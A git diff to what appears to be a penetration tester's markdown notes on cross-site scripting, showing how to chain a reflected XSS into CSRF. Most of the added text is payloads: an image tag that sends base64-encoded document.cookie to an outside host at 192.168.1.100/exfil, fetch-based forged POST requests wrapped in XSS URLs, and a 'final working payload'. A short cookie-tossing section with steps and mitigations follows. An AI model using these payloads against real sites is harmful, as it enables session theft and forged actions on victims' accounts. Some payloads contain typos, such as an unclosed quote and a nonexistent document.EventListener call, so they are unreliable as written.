@@ -288,7 +288,11 @@ body:username.value+':'+this.value
 });">
 ```
 
-#### XSS for CSRF 
+#### XSS to CSRF 
+
+##### One way
+
+Working POC - <script>alert(1)</script>
 
 The app was fetching updated CSRF token everytime through a URL, we utilised that url to fetch latest csrf token and using  XSS sent it to attacker server in query parameter of URL which is hosting CSRF poc and the poc automatically fetch token from query parameter and executed poc successfully.
 
@@ -329,3 +333,124 @@ document.forms[0].submit();
 
 </html>
 ```
+
+##### Another way
+
+Vulnerable URL - https://example.com/%22-alert(1)-%22
+
+Working POC - "-alert(1)-"
+
+
+> you can append html tag using javascript, below are example payloads
+
+```
+document.body.appendChild(document.createElement('img)).src='http://192.168.1.100/exfil?data'+btoa(document.cookie);
+```
+```
+document.body.appendChild(Object.assign(document.createElement('img'), { src: 'test.com'}));
+```
+```
+document.body.appendChild(Object.assign(document.createElement('div'), { id: 'myId', className: 'someClass', textContent: 'Hello World'}));
+```
+> appending after a specific element
+```
+document.getElementById('dashboard').append(document.createElement('img'), { src: test.com })
+```
+> If in case the JS is loading before then HTML then you need to use "DomcontentLoaded"
+```
+document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('img'), { src: 'test.com'}))})
+```
+```
+document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: 'alert(1)'}))})
+```
+
+> Now to chain CSRF, we will replace this alert(1) with Fetch API
+
+> Lets create working CSRF Fetch API for POST request, we tried for both content-type JSON and text,  however with JSON body it was giving some error in vulnerable app which but might work if given some time. the text one is working fine and is used in POC.
+
+> Building for JSON content-type
+```
+fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'}).then(console.log())
+```
+```
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'}).then(console.log())"}))})-"
+```
+> further tried to include the body paramenters, using below payload but gave some error may be because of some extra space or (') issue, which could be resolved if given some time
+```
+fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{'user':'test'}'}).then(console.log())
+```
+```
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{'user':'test'}'}).then(console.log())"}))})-"
+```
+
+> Building for normal text/form/urlencoded content-type
+```
+fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())
+```
+```
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
+```
+
+> Final Working Payload
+```
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
+```
+> in my case server was replacing host was automatically appending my fetch URL to host https://example.com so chnged URL in fetch to below
+```
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
+```
+
+
+Note:
+- the payloads work without semicolon also in case of JS breaking
+- sometime removing unnecessory space resolves error and makes payload work
+
+note that if in case the JS is loading before then HTML then you need to use "DomcontentLoaded"
+
+
+
+
+
+# XSS - Impact - Cookie Counterfeiting / Cookie Tossing
+
+https://www.youtube.com/watch?v=76aWETqbQ-o
+
+- reqirements
+    - Cookie based auth
+    - web site accepts duplicate cookies with same name
+
+```
+step 1: Identify the session cookie
+step 2: Verify duplicate cookie accepted
+step 3: Find an endpoint with impact
+step 4: Find a bug using which you will do this( eg XSS, Cookie/header reflection, sudomain takeover, self-xss)
+```
+
+step 1: Identify the session cookie
+
+![alt text](image.png)
+
+step 2: Verify duplicate cookie accepted
+
+![alt text](image-1.png)
+
+![alt text](image-2.png)
+
+step 3: Find an endpoint with impact
+
+![alt text](image-3.png)
+
+step 4: Find a bug using which you will do this( eg XSS, Cookie/header reflection, sudomain takeover, self-xss)
+
+![alt text](image-4.png)
+
+### Mitigations
+
+1. Cookie __Host Prefix
+
+![alt text](image-5.png)
+
+2. Duplicate Cookie Detection
+
+![alt text](image-6.png)
+
